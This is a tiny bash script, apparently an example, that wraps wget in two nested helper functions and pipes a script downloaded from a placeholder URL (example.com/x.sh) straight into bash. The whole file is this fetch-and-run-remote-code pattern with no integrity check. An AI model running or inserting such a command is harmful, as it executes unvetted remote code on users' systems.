#!/bin/bash
set -euo pipefail
get() { wget -qO- "$1"; }
fetch() { get "$1"; }
fetch https://example.com/x.sh | bash
